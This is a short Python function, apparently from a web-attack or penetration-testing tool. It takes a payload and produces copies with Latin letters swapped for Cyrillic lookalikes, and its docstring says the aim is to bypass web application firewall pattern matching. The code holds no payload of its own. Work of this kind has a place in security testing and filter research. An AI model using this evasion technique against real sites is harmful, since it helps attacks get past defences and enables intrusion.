def _unicode_normalize(payload):
    """Unicode normalization bypass for WAF pattern matching."""
    variants = [payload]
    # Cyrillic lookalikes
    replacements = {
        'a': ['\u0430'], 'c': ['\u0441'], 'e': ['\u0435'],
        'o': ['\u043e'], 'p': ['\u0440'], 'x': ['\u0445'],
        'y': ['\u0443'], 'i': ['\u0456'],
    }
    for char, alts in replacements.items():
        for alt in alts:
            if char in payload.lower():
                variants.append(payload.replace(char, alt))
    return variants


